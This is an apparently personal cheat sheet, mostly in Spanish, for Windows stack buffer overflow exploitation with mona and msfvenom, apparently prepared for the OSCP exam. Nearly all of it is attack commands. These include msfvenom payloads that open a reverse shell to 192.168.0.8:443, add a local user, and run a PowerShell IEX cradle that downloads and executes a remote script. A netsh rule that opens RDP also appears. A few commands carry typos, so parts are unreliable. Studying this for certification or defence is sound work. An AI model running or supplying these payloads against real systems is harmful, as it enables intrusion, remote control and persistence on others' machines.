---
title: 'Mona basics'
description: ''
pubDate: 'Jul 08 2022'
slug: 'buffer-overflow/code'
---

[Guia de Tib3rius para el OSCP](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

```bash
# A ASM version of the executable
objdump -d -Mintel goodpw.exe > disassembled

!mona config -set workingfolder C:/User/printer/Desktop

# Cuando payload = offset + eip + b"C"*200 van al espcreamos nuestro bytearray para ver badchars lo pasamos con impacket-smbserver
# impacket-smbserver smbfolder $(pwd) -smb2support

!mona bytearray -cpb "\x00" -> insted 'C' string

!mona compare -a 0xESP -f C:\Users\printer\bytearray.bin

# eip ya tienes off_set, EIP +  B"\x90"*20=space  ,  bad chars shellcode msfvenom

!mona modules
!mona find -s "\xFF\xE4" -m CMS.exe
# tools/exploit/nasm_shell.rb jmp ESP
eip = pack("<L", 0xFIND)

eip se encuetra = !mona find -s "\xFF\xE4" -m minishare.exe | SLMFC.DLL

# si no encuentra : !mona findwild -s "JMP ESP" te vas a la pestaña 'l' nos cojemos el puntero q no tenga badchars y lo pegamos en minuscula el addrs en nuestro script que corresponde a pack('<L', 0xaddrs_pointer)

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.8 LPORT=443 -f c -e x86/shikata_ga_nai EXITFUNC=thread -b "\x00\x0a\x0d"
# msfvenom -a x86 --platform windows -p windows/exec CMD="net user pasado /add" -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5
netsh advfirewall firewall add rule name="Regla de Firewall RDP" dir=in action=allow protocol=TCP localport=3389
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

jmp ESP
#o alternativa con nods
sub esp,0x10

!mona modules

trick: if to many bad char remove -e x86/shikata_ga_nai

msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.8/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread

nishang Incoke.powershelltcp.ps1

###
!mona jmp -r esp
!mona jmp -r esp -m kernel

#find eip creating chars
!mona pc 1100

# eip finded
!mona po 30682439

# find jpm or call
!mona jpm -r esp -m kernel
```
